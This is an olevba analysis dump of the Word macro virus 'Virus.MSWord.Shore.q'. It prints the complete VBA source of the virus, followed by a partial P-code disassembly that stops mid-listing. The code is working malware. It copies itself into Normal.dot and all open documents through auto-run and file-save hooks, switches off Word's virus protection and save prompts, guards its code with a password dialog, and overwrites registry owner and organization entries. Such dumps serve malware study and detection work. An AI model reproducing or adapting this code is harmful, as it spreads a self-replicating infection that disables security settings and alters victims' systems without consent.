olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Shore.q
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Shore.q - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sht.bas 
in file: Virus.MSWord.Shore.q - OLE stream: 'Macros/VBA/Sht'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
'Thanks to cyberHack, Astia, Marker, etc.
'I love ITS
'
'Public declaration
'
'
Public Const SeriesNumber = 990910
Public Const ModuleName = "Sht", mw = "Microsoft Word", _
        OFC = "Dj Computer Rental", _
        Peace = "Terima Kasih, LitTle_bUg", _
        SerNum$ = "Series Number", _
        pass = "Password : ", _
        badboy = "Want to be a bad boy....", _
        scrollCap = "Normal." & ModuleName & ".scrollCaption"

Public Const mname = "LiTtlE_bUg", site = "http://rascal321.cjb.net", _
             isoft = "Bandung - 40131", hklm = "HKEY_LOCAL_MACHINE\", _
             hkcu = "HKEY_CURRENT_USER\", sm = "Software\Microsoft\", cv = "Windows\CurrentVersion\", ACME = "MS Setup (ACME)\User Info\"

Public Const msg = "Unable to get the access. Request aborted...", _
        aaa = "§·_n²__", bbb = "wenni", ccc = "sht0730", _
        abadacc = "Bad Access...", _
        code = "backbone240274", ddd = "junkies9908", eee = "Timor9909"

Public anCap As String, anInt As Single, anPos As Integer, Animated As Boolean, _
        ToolsOptionsDlg As Dialog, _
        OrganizerDlg As Dialog, _
        ToolsTemplatesDlg As Dialog, _
        ToolsMacrosDlg As Dialog, _
        FormatStyleDlg As Dialog

'procedures in Offe module
Sub Buggy()
Dim aDocProp As DocumentProperty
    For Each aDocProp In NormalTemplate.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
    
    NormalTemplate.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False
End Sub

Function getDocPropExist(theObject As Object) As Boolean
Dim adp As DocumentProperty
    getDocPropExist = False
    For Each adp In theObject.CustomDocumentProperties
    With adp
        If .Name = SerNum$ And .Type = msoPropertyTypeNumber And _
            .Value = SeriesNumber Then
            getDocPropExist = True
            Exit Function
        End If
    End With
    Next adp
End Function

Function getModuleExist(theObject As Object) As Boolean
Dim aDocProp As DocumentProperty
    getModuleExist = False
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name = ModuleName Then
            getModuleExist = True
            Exit Function
        End If
    Next anObject
End Function
    
Function getInfected(theObject As Object) As Boolean
    getInfected = getModuleExist(theObject) And getDocPropExist(theObject)
End Function

Sub clearMacros(theObject As Object)
Dim aDocProp As DocumentProperty
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=theObject.FullName, _
            Name:=anObject.Name, Object:=wdOrganizerObjectProjectItems
        Else
            On Error Resume Next
            With anObject.codemodule
                .deletelines 1, .countoflines
            End With
        End If
    Next anObject
    
    For Each aDocProp In theObject.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
End Sub

Sub copyMacros(theSource As Object, theDestination As Object)
Dim aDocProp As DocumentProperty
    If Not getDocPropExist(theDestination) Then _
        theDestination.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False

    On Error Resume Next
        Application.OrganizerCopy _
            Source:=theSource.FullName, _
            Destination:=theDestination.FullName, _
            Name:=ModuleName, _
            Object:=wdOrganizerObjectProjectItems
End Sub

Sub Infecting(theSource As Object, theDestination As Object)
    On Error Resume Next
    If Not getInfected(theDestination) Then
        Application.OrganizerRename _
            Source:=theDestination.FullName, _
            Name:=ModuleName, newname:="xxxx", _
            Object:=wdOrganizerObjectProjectItems
        clearMacros theDestination
        copyMacros theSource, theDestination
        On Error Resume Next
        theDestination.Save True
    End If
End Sub

Sub Copy2Normal()
Dim ATemp As Template
    Stealth
    If Documents.Count > 0 Then
        Infecting ActiveDocument, NormalTemplate
        If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
            Infecting ActiveDocument, ActiveDocument.AttachedTemplate
        For Each ATemp In Templates
            Infecting ActiveDocument, ATemp
        Next ATemp
    End If
    
    With NormalTemplate.VBProject.VBComponents(1).codemodule
        .deletelines 1, .countoflines
    End With
End Sub

Sub Copy2Document()
Dim Adoc As Document
    Stealth
    For Each Adoc In Documents
        Infecting NormalTemplate, Adoc
        On Error Resume Next
        WordBasic.viewpage
    Next Adoc
    If Documents.Count > 0 Then _
    If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
        Infecting NormalTemplate, ActiveDocument.AttachedTemplate
End Sub

Sub Jump2Normal(macName As String)
    Application.Run "normal." & ModuleName & "." & macName
End Sub

'infection procedures
Sub AutoOpen()
    Stealth
    WordBasic.DisableAutoMacros True
    
    If getModuleExist(NormalTemplate) Then
        Jump2Normal ("Copy2Document")
        If Documents.Count > 0 Then
            On Error Resume Next
            ActiveDocument.Save
        End If
    Else
        act
        Copy2Normal
        On Error Resume Next
        NormalTemplate.Save
    End If
End Sub

Sub FileOpen()
    bday
    Stealth
    WordBasic.DisableAutoMacros True
    AnimateCaption
        
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        AutoOpen
        On Error Resume Next
        ActiveDocument.Saved = True
        ActiveDocument.Save
    End If
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoClose()
    AnimateCaption
    Stealth
    On Error Resume Next
'    AutoOpen
    Copy2Document
    If Not ActiveDocument.Saved And ActiveDocument.Characters.Count > 0 Then ActiveDocument.Save
    ActiveDocument.Saved = True
    ModifyAttr ActiveDocument.FullName
End Sub

Sub FileClose()
Dim afn As String
    bday
    act
    AnimateCaption
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    AutoClose
    afn = ActiveDocument.FullName
    ActiveDocument.Close
    ModifyAttr afn
    WordBasic.DisableAutoMacros False
End Sub

Sub FileSave()
    bday
    act
    AnimateCaption
    WordBasic.DisableAutoMacros True
    
    Copy2Document
    On Error Resume Next
    With ActiveDocument
        .Save
        .Saved = True
    End With
    WordBasic.DisableAutoMacros False
End Sub

Sub InitDialog()
    Stealth
    Application.DisplayAlerts = wdAlertsNone
    On Error Resume Next
    Set ToolsOptionsDlg = Dialogs(wdDialogToolsOptions)
    Set OrganizerDlg = Dialogs(wdDialogOrganizer)
    Set ToolsTemplatesDlg = Dialogs(wdDialogToolsTemplates)
    Set ToolsMacrosDlg = Dialogs(wdDialogToolsMacro)
    Set FormatStyleDlg = Dialogs(wdDialogFormatStyle)
End Sub
        
Sub AutoExec()
Dim Combar As CommandBar
    WordBasic.DisableAutoMacros True
    InitDialog
    Animated = False
    AnimateCaption
    Copy2Normal
    If getInfected(NormalTemplate) Then Copy2Document
    ModifyAttr NormalTemplate.FullName
    Buggy
    For Each Combar In Application.CommandBars
     
     
    Next Combar
End Sub

Sub AutoExit()
    AutoOpen
    AnimateCaption
    ModifyAttr NormalTemplate.FullName
End Sub

Sub fileNewDefault()
    AnimateCaption
    WordBasic.fileNewDefault
    Copy2Document
End Sub

Sub FileNew()
    If Dialogs(wdDialogFileNew).Show <> 0 Then
        AnimateCaption
        Copy2Document
    End If
End Sub

Sub Stealth()
    With Options
        .SaveNormalPrompt = False
        .SavePropertiesPrompt = False
        .VirusProtection = False
    End With
End Sub

Sub NoStealth()
    With Options
        .SaveNormalPrompt = True
        .SavePropertiesPrompt = True
        .VirusProtection = True
    End With
End Sub

Sub ToolsOptions()
    InitDialog
    NoStealth
    On Error Resume Next
    ToolsOptionsDlg.Display
    AnimateCaption
    Stealth
End Sub

Sub NoAccess()
    a = MsgBox(msg, vbExclamation, abadacc)
    AnimateCaption
End Sub

Function passDialog() As Boolean
Dim cruel As String
    passDialog = False
    cruel = ccc + Mid(code, 9, 2)
    If LCase(InputBox(pass, badboy)) = cruel Then
        passDialog = True
    Else
        NoAccess
    End If
End Function


Sub ToolsMacro()
    InitDialog
    ToolsMacrosDlg.Display
    AnimateCaption
End Sub

Sub FileTemplates()
    InitDialog
    ToolsTemplatesDlg.Display
'    CustomizationContext = NormalTemplate
    AnimateCaption
End Sub

Sub viewvbcode()
    Application.ShowVisualBasicEditor = passDialog
End Sub

Sub viewcode()
    viewvbcode
End Sub

Sub Organizer()
    InitDialog
    OrganizerDlg.Display
    AnimateCaption
End Sub

Sub FormatStyle()
    InitDialog
    With FormatStyleDlg
        .Display
        .Execute
    End With
    AnimateCaption
End Sub

Sub ModifyAttr(fileName As String)
    On Error Resume Next
    If GetAttr(fileName) <> vbArchive Then SetAttr fileName, vbArchive
End Sub

Sub AnimateCaption()
    On Error Resume Next
    If Documents.Count > 0 Then WordBasic.viewpage
    If Animated Then Exit Sub
    anIntv = 0.5
    anPos = 0
    anCap = OFC
    Application.OnTime Now + TimeSerial(0, 0, 3), scrollCap
    Animated = True
End Sub

Sub ScrollCaption()
    If Animated Then
        Application.Caption = Right$(anCap, anPos)
        Application.OnTime Now + TimeSerial(0, 0, anIntv), scrollCap
        anPos = anPos + 1
    End If
    
    If anPos > Len(anCap) Then
        On Error Resume Next
        WordBasic.viewpage
        
        anPos = 0
        If anCap = OFC Then
            anCap = Peace
            Application.OnTime Now + TimeSerial(0, 0, 5), scrollCap
            Animated = True
        ElseIf anCap = Peace Then
            anCap = mw
            Application.OnTime Now + TimeSerial(0, 0, 5), scrollCap
            Animated = True
        ElseIf anCap = mw Then
            anCap = OFC
            Application.OnTime Now + TimeSerial(0, 0, 1200), scrollCap
            Animated = False
        End If
    End If
End Sub

Sub bday()
Dim msg As String, ent As String, quo As String
        ent = Chr$(13)
        quo = Chr$(34)
On Error Resume Next
    If Month(Now) = 10 And Day(Now) = 24 Then
        msg = "      SELAMAT ULANG TAHUN untuk Chd" & ent
        msg = msg & "     Semoga panjang umur dan sukses selalu." & ent
        msg = msg & "Untuk itu sebaiknya anda meliburkan diri hari ini" & ent
        msg = msg & "dan memberikan ucapan selamat juga untuk, " & quo & "Chd" & quo & "."
        msg = msg & ent & ent & "                        - Terimakasih -"
        msg = msg & ent & ".:: CrlShtVvMrtAchSnRsyDdStrBsyEdwAndDj ::. "
        MsgBox msg, 64, OFC
'        Application.OnTime Now + TimeSerial(0, 5, 0), "appexit"
        System.Cursor = 2
ElseIf Month(Now) = 7 And Day(Now) = 30 Then
        msg = "      SELAMAT ULANG TAHUN untuk Sht" & ent
        msg = msg & "     Semoga panjang umur dan sukses selalu." & ent
        msg = msg & "Untuk itu sebaiknya anda meliburkan diri hari ini" & ent
        msg = msg & "dan memberikan ucapan selamat juga untuk, " & quo & "Sht" & quo & "."
        msg = msg & ent & ent & "                        - Terimakasih -"
        msg = msg & ent & ".:: CrlShtVvMrtAchSnRsyDdStrBsyEdwAndDj ::. "
        MsgBox msg, 64, OFC
'        Application.OnTime Now + TimeSerial(0, 5, 0), "appexit"
        System.Cursor = 2
Else
    Exit Sub
End If
End Sub

Sub act()
On Error Resume Next
Dim org As String
    With System
        org = .PrivateProfileString("", hklm & sm & cv, "RegisteredOwner")
        If org <> mname Then
            .PrivateProfileString("", hkcu & "Control Panel\International\", "s1159") = "Shinta"
            .PrivateProfileString("", hkcu & "Control Panel\International\", "s2359") = "Shinta"
            .PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "InfoTip") = OFC & "...."
            .PrivateProfileString("", hkcu & sm & "Internet Explorer\PageSetup\", "footer") = OFC & " &u&b&d"
            .PrivateProfileString("", hkcu & sm & "Internet Explorer\PageSetup\", "header") = mname & " &w&bPage &p of &P"
           .PrivateProfileString("", hklm & sm & cv, "OrgOwner") = org
           org = .PrivateProfileString("", hklm & sm & cv, "RegisteredOrganization")
           .PrivateProfileString("", hklm & sm & cv, "OrgOrganization") = org
           org = .PrivateProfileString("", hkcu & sm & ACME, "DefName")
           .PrivateProfileString("", hkcu & sm & ACME, "OrgName") = org
           org = .PrivateProfileString("", hkcu & sm & ACME, "DefCompany")
           .PrivateProfileString("", hkcu & sm & ACME, "OrgCompany") = org
           .PrivateProfileString("", hkcu & sm & ACME, "DefName") = Peace
           .PrivateProfileString("", hkcu & sm & ACME, "DefCompany") = mname
           .PrivateProfileString("", hklm & sm & cv, "RegisteredOwner") = mname
           .PrivateProfileString("", hklm & sm & cv, "RegisteredOrganization") = isoft
        End If
    End With
    With Application
        .UserName = mname
        .UserInitials = "Sht"
    End With
   Stealth
   With Dialogs(86)
        .Author = "Shinta Yulianti - LitTle_bUg"
        .Title = OFC
        .Subject = Peace
        .Comments = "This is not dangerous virus, please do not " & "delete or modify this macros. Thank you. "
        .Execute
    End With
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Shore.q
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/Sht - 23229 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1:
' 	QuoteRem 0x0000 0x0028 "Thanks to cyberHack, Astia, Marker, etc."
' Line #2:
' 	QuoteRem 0x0000 0x000A "I love ITS"
' Line #3:
' 	QuoteRem 0x0000 0x0000 ""
' Line #4:
' 	QuoteRem 0x0000 0x0012 "Public declaration"
' Line #5:
' 	QuoteRem 0x0000 0x0000 ""
' Line #6:
' 	QuoteRem 0x0000 0x0000 ""
' Line #7:
' 	Dim (Public Const) 
' 	LitDI4 0x1EBE 0x000F 
' 	VarDefn SeriesNumber
' Line #8:
' 	LineCont 0x0018 0A 00 08 00 0E 00 08 00 12 00 08 00 16 00 08 00 1A 00 08 00 1E 00 08 00
' 	Dim (Public Const) 
' 	LitStr 0x0003 "Sht"
' 	VarDefn ModuleName
' 	LitStr 0x000E "Microsoft Word"
' 	VarDefn mw
' 	LitStr 0x0012 "Dj Computer Rental"
' 	VarDefn OFC
' 	LitStr 0x0018 "Terima Kasih, LitTle_bUg"
' 	VarDefn Peace
' 	LitStr 0x000D "Series Number"
' 	VarDefn SerNum
' 	LitStr 0x000B "Password : "
' 	VarDefn pass
' 	LitStr 0x0018 "Want to be a bad boy...."
' 	VarDefn badboy
' 	LitStr 0x0007 "Normal."
' 	Ld ModuleName 
' 	Concat 
' 	LitStr 0x000E ".scrollCaption"
' 	Concat 
' 	VarDefn scrollCap
' Line #9:
' Line #10:
' 	LineCont 0x0008 0A 00 0D 00 12 00 0D 00
' 	Dim (Public Const) 
' 	LitStr 0x000A "LiTtlE_bUg"
' 	VarDefn mname
' 	LitStr 0x0018 "http://rascal321.cjb.net"
' 	VarDefn site
' 	LitStr 0x000F "Bandung - 40131"
' 	VarDefn isoft
' 	LitStr 0x0013 "HKEY_LOCAL_MACHINE\"
' 	VarDefn hklm
' 	LitStr 0x0012 "HKEY_CURRENT_USER\"
' 	VarDefn hkcu
' 	LitStr 0x0013 "Software\Microsoft\"
' 	VarDefn sm
' 	LitStr 0x0017 "Windows\CurrentVersion\"
' 	VarDefn cv
' 	LitStr 0x001A "MS Setup (ACME)\User Info\"
' 	VarDefn ACME
' Line #11:
' Line #12:
' 	LineCont 0x000C 06 00 08 00 12 00 08 00 16 00 08 00
' 	Dim (Public Const) 
' 	LitStr 0x002C "Unable to get the access. Request aborted..."
' 	VarDefn msg
' 	LitStr 0x0007 "§·_n²__"
' 	VarDefn aaa
' 	LitStr 0x0005 "wenni"
' 	VarDefn bbb
' 	LitStr 0x0007 "sht0730"
' 	VarDefn ccc
' 	LitStr 0x000D "Bad Access..."
' 	VarDefn abadacc
' 	LitStr 0x000E "backbone240274"
' 	VarDefn code
' 	LitStr 0x000B "junkies9908"
' 	VarDefn ddd
' 	LitStr 0x0009 "Timor9909"
' 	VarDefn eee
' Line #13:
' Line #14:
' 	LineCont 0x0014 11 00 08 00 15 00 08 00 19 00 08 00 1D 00 08 00 21 00 08 00
' 	Dim (Public) 
' 	VarDefn anCap (As String)
' 	VarDefn anInt (As Single)
' 	VarDefn anPos (As Integer)
' 	VarDefn Animated (As Boolean)
' 	VarDefn ToolsOptionsDlg
' 	VarDefn OrganizerDlg
' 	VarDefn ToolsTemplatesDlg
' 	VarDefn ToolsMacrosDlg
' 	VarDefn FormatStyleDlg
' Line #15:
' Line #16:
' 	QuoteRem 0x0000 0x0019 "procedures in Offe module"
' Line #17:
' 	FuncDefn (Sub Buggy())
' Line #18:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #19:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #20:
' 	Ld aDocProp 
' 	ArgsMemCall Delete 0x0000 
' Line #21:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	NextVar 
' Line #22:
' Line #23:
' 	LineCont 0x0010 05 00 0C 00 09 00 0C 00 0D 00 0C 00 11 00 0C 00
' 	Ld SerNum$ 
' 	ParamNamed New 
' 	Ld msoPropertyTypeNumber 
' 	ParamNamed TypeOf 
' 	Ld SeriesNumber 
' 	ParamNamed Value 
' 	LitVarSpecial (False)
' 	ParamNamed LinkToContent 
' 	Ld NormalTemplate 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' Line #24:
' 	EndSub 
' Line #25:
' Line #26:
' 	FuncDefn (Function getDocPropExist(theObject As Object) As Boolean)
' Line #27:
' 	Dim 
' 	VarDefn adp (As DocumentProperty)
' Line #28:
' 	LitVarSpecial (False)
' 	St getDocPropExist 
' Line #29:
' 	StartForVariable 
' 	Ld adp 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #30:
' 	StartWithExpr 
' 	Ld adp 
' 	With 
' Line #31:
' 	LineCont 0x0004 0B 00 0C 00
' 	MemLdWith New 
' 	Ld SerNum$ 
' 	Eq 
' 	MemLdWith TypeOf 
' 	Ld msoPropertyTypeNumber 
' 	Eq 
' 	And 
' 	MemLdWith Value 
' 	Ld SeriesNumber 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #32:
' 	LitVarSpecial (True)
' 	St getDocPropExist 
' Line #33:
' 	ExitFunc 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	EndWith 
' Line #36:
' 	StartForVariable 
' 	Ld adp 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' 	EndFunc 
' Line #38:
' Line #39:
' 	FuncDefn (Function getModuleExist(theObject As Object) As Boolean)
' Line #40:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #41:
' 	LitVarSpecial (False)
' 	St getModuleExist 
' Line #42:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #43:
' 	Ld anObject 
' 	MemLd New 
' 	Ld ModuleName 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	LitVarSpecial (True)
' 	St getModuleExist 
' Line #45:
' 	ExitFunc 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	NextVar 
' Line #48:
' 	EndFunc 
' Line #49:
' Line #50:
' 	FuncDefn (Function getInfected(theObject As Object) As Boolean)
' Line #51:
' 	Ld theObject 
' 	ArgsLd getModuleExist 0x0001 
' 	Ld theObject 
' 	ArgsLd getDocPropExist 0x0001 
' 	And 
' 	St getInfected 
' Line #52:
' 	EndFunc 
' Line #53:
' Line #54:
' 	FuncDefn (Sub clearMacros(theObject As Object))
' Line #55:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #56:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #57:
' 	Ld anObject 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #58:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld theObject 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld anObject 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #59:
' 	ElseBlock 
' Line #60:
' 	OnError (Resume Next) 
' Line #61:
' 	StartWithExpr 
' 	Ld anObject 
' 	MemLd codemodule 
' 	With 
' Line #62:
' 	LitDI2 0x0001 
' 	MemLdWith countoflines 
' 	ArgsMemCallWith deletelines 0x0002 
' Line #63:
' 	EndWith 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	NextVar 
' Line #66:
' Line #67:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #68:
' 	Ld aDocProp 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	NextVar 
' Line #70:
' 	EndSub 
' Line #71:
' Line #72:
' 	FuncDefn (Sub copyMacros(theSource As Object, theDestination As Object))
' Line #73:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #74:
' 	LineCont 0x0014 07 00 08 00 0C 00 0C 00 10 00 0C 00 14 00 0C 00 18 00 0C 00
' 	Ld theDestination 
' 	ArgsLd getDocPropExist 0x0001 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld SerNum$ 
' 	ParamNamed New 
' 	Ld msoPropertyTypeNumber 
' 	ParamNamed TypeOf 
' 	Ld SeriesNumber 
' 	ParamNamed Value 
' 	LitVarSpecial (False)
' 	ParamNamed LinkToContent 
' 	Ld theDestination 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' 	EndIf 
' Line #75:
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' 	LineCont 0x0010 03 00 0C 00 09 00 0C 00 0F 00 0C 00 13 00 0C 00
' 	Ld theSource 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld theDestination 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #78:
' 	EndSub 
' Line #79:
' Line #80:
' 	FuncDefn (Sub Infecting(theSource As Object, theDestination As Object))
' Line #81:
' 	OnError (Resume Next) 
' Line #82:
' 	Ld theDestination 
' 	ArgsLd getInfected 0x0001 
' 	Not 
' 	IfBlock 
' Line #83:
' 	LineCont 0x000C 03 00 0C 00 09 00 0C 00 11 00 0C 00
' 	Ld theDestination 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	LitStr 0x0004 "xxxx"
' 	ParamNamed newname 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #84:
' 	Ld theDestination 
' 	ArgsCall clearMacros 0x0001 
' Line #85:
' 	Ld theSource 
' 	Ld theDestination 
' 	ArgsCall copyMacros 0x0002 
' Line #86:
' 	OnError (Resume Next) 
' Line #87:
' 	LitVarSpecial (True)
' 	Ld theDestination 
' 	ArgsMemCall Save 0x0001 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	EndSub 
' Line #90:
' Line #91:
' 	FuncDefn (Sub Copy2Normal())
' Line #92:
' 	Dim 
' 	VarDefn ATemp (As Template)
' Line #93:
' 	ArgsCall Stealth 0x0000 
' Line #94:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #95:
' 	Ld ActiveDocument 
' 	Ld NormalTemplate 
' 	ArgsCall Infecting 0x0002 
' Line #96:
' 	LineCont 0x0004 07 00 0C 00
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Ld NormalTemplate 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	ArgsCall Infecting 0x0002 
' 	EndIf 
' Line #97:
' 	StartForVariable 
' 	Ld ATemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #98:
' 	Ld ActiveDocument 
' 	Ld ATemp 
' 	ArgsCall Infecting 0x0002 
' Line #99:
' 	StartForVariable 
' 	Ld ATemp 
' 	EndForVariable 
' 	NextVar 
' Line #100:
' 	EndIfBlock 
' Line #101:
' Line #102:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #103:
' 	LitDI2 0x0001 
' 	MemLdWith countoflines 
' 	ArgsMemCallWith deletelines 0x0002 
' Line #104:
' 	EndWith 
' Line #105:
' 	EndSub 
' Line #106:
' Line #107:
' 	FuncDefn (Sub Copy2Document())
' Line #108:
' 	Dim 
' 	VarDefn Adoc (As Document)
' Line #109:
' 	ArgsCall Stealth 0x0000 
' Line #110:
' 	StartForVariable 
' 	Ld Adoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #111:
' 	Ld NormalTemplate 
' 	Ld Adoc 
' 	ArgsCall Infecting 0x0002 
' Line #112:
' 	OnError (Resume Next) 
' Line #113:
' 	Ld WordBasic 
' 	ArgsMemCall viewpage 0x0000 
' Line #114:
' 	StartForVariable 
' 	Ld Adoc 
' 	EndForVariable 
' 	NextVar 
' Line #115:
' 	LineCont 0x0008 07 00 04 00 0E 00 08 00
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Ld NormalTemplate 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	ArgsCall Infecting 0x0002 
' 	EndIf 
' 	EndIf 
' Line #116:
' 	EndSub 
' Line #117:
' Line #118:
' 	FuncDefn (Sub Jump2Normal(macName As String))
' Line #119:
' 	LitStr 0x0007 "normal."
' 	Ld ModuleName 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	Ld macName 
' 	Concat 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #120:
' 	EndSub 
' Line #121:
' Line #122:
' 	QuoteRem 0x0000 0x0014 "infection procedures"
' Line #123:
' 	FuncDefn (Sub AutoOpen())
' Line #124:
' 	ArgsCall Stealth 0x0000 
' Line #125:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #126:
' Line #127:
' 	Ld NormalTemplate 
' 	ArgsLd getModuleExist 0x0001 
' 	IfBlock 
' Line #128:
' 	LitStr 0x000D "Copy2Document"
' 	Paren 
' 	ArgsCall Jump2Normal 0x0001 
' Line #129:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #130:
' 	OnError (Resume Next) 
' Line #131:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #132:
' 	EndIfBlock 
' Line #133:
' 	ElseBlock 
' Line #134:
' 	ArgsCall act 0x0000 
' Line #135:
' 	ArgsCall Copy2Normal 0x0000 
' Line #136:
' 	OnError (Resume Next) 
' Line #137:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #138:
' 	EndIfBlock 
' Line #139:
' 	EndSub 
' Line #140:
' Line #141:
' 	FuncDefn (Sub FileOpen())
' Line #142:
' 	ArgsCall bday 0x0000 
' Line #143:
' 	ArgsCall Stealth 0x0000 
' Line #144:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #145:
' 	ArgsCall AnimateCaption 0x0000 
' Line #146:
' Line #147:
' 	OnError (Resume Next) 
' Line #148:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #149:
' 	ArgsCall AutoOpen 0x0000 
' Line #150:
' 	OnError (Resume Next) 
' Line #151:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #152:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #153:
' 	EndIfBlock 
' Line #154:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #155:
' 	EndSub 
' Line #156:
' Line #157:
' 	FuncDefn (Sub AutoClose())
' Line #158:
' 	ArgsCall AnimateCaption 0x0000 
' Line #159:
' 	ArgsCall Stealth 0x0000 
' Line #160:
' 	OnError (Resume Next) 
' Line #161:
' 	QuoteRem 0x0000 0x000C "    AutoOpen"
' Line #162:
' 	ArgsCall Copy2Document 0x0000 
' Line #163:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Not 
' 	Ld ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
